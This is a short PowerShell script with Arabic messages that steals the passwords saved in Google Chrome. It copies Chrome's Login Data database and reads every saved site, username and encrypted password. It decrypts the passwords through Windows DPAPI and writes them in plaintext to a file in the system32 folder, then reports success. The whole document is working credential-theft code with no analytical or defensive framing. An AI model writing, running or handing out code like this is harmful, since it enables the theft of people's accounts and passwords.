$outputPath = "C:\WINDOWS\system32\Decrypted_Passwords.txt"
$chromeLoginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"

if (!(Test-Path $chromeLoginData)) {
    Write-Host "[-] لم يتم العثور على ملف بيانات تسجيل الدخول لمتصفح كروم." -ForegroundColor Red
    return
}

# التحقق من توفر System.Data.SQLite
try {
    Add-Type -AssemblyName System.Data.SQLite -ErrorAction Stop
} catch {
    Write-Host "[-] مكتبة System.Data.SQLite غير مثبتة." -ForegroundColor Red
    Write-Host "[*] يمكن تحميلها من: https://system.data.sqlite.org/index.html/doc/trunk/www/downloads.wiki" -ForegroundColor Yellow
    return
}

$tempFile = "$env:TEMP\LoginData_Temp.db"
Copy-Item -Path $chromeLoginData -Destination $tempFile -Force

try {
    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempFile;Version=3;Read Only=True;")
    $conn.Open()
    
    $cmd = $conn.CreateCommand()
    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
    
    $adapter = New-Object System.Data.SQLite.SQLiteDataAdapter($cmd)
    $dataset = New-Object System.Data.DataSet
    [void]$adapter.Fill($dataset)
    
    $results = @()
    foreach ($row in $dataset.Tables[0].Rows) {
        $url = $row["origin_url"]
        $username = $row["username_value"]
        $encryptedPassword = $row["password_value"]
        
        $decryptedPassword = ""
        if ($null -ne $encryptedPassword -and $encryptedPassword.Length -gt 0) {
            try {
                $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
                    $encryptedPassword,
                    $null,
                    [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                )
                $decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
            } catch {
                $decryptedPassword = "[فشل فك التشفير أو مشفر بطريقة أحدث]"
            }
        }
        
        if (-not [string]::IsNullOrEmpty($username)) {
            $results += "الموقع: $url`r`nاسم المستخدم: $username`r`nكلمة المرور: $decryptedPassword`r`n-----------------------------------"
        }
    }
    
    $conn.Close()
    
    $results | Out-File -FilePath $outputPath -Encoding UTF8
    Write-Host "[+] تمت العملية بنجاح! تم حفظ البيانات المفكوكة في: $outputPath" -ForegroundColor Green

} catch {
    Write-Host "[-] حدث خطأ أثناء قراءة قاعدة البيانات: $_" -ForegroundColor Red
} finally {
    if (Test-Path $tempFile) { 
        Remove-Item $tempFile -Force 
    }
}

